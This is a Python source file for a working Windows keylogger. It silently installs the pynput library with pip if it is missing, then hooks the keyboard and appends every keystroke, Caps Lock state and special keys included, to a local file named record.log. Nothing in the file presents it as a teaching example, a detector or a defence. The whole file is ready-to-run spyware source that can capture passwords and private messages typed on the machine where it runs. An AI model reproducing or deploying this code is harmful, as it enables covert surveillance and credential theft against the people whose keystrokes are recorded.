import subprocess
import sys
import ctypes

# Check if pynput is installed
try:
    import pynput
except ImportError:
    print("pynput is not installed. Installing...")
    
    # Install pynput using pip
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    
    # Check again if pynput is now installed
    try:
        import pynput
        print("pynput installed successfully.")
    except ImportError:
        print("Failed to install pynput. Please install it manually.")
        sys.exit(1)

from pynput import keyboard

text = ""

def is_caps_lock_on():
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL) & 0x0001


def on_press(key):
    try:
        global text
        # Handle special keys
        if key == keyboard.Key.enter:
            text += "\n" + "[ENTER]" + "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key in {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
            text += "[CTRL]"
        elif key == keyboard.Key.shift:
            text += "[SHIFT]"
        elif key == keyboard.Key.esc:
            text += "[ESC]"
        elif key == keyboard.Key.backspace:
            text += "[BACKSPACE]"
        else:
            if is_caps_lock_on():
                #text += "[CAPSLOCK_ON]"
                text += str(key.char).upper()
            else:
                #text += "[CAPSLOCK_OFF]"
                text += str(key.char) 
            
        with open("record.log", "a") as logkey:
            logkey.write(text)
            text=""

    except AttributeError:
        pass
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    input()
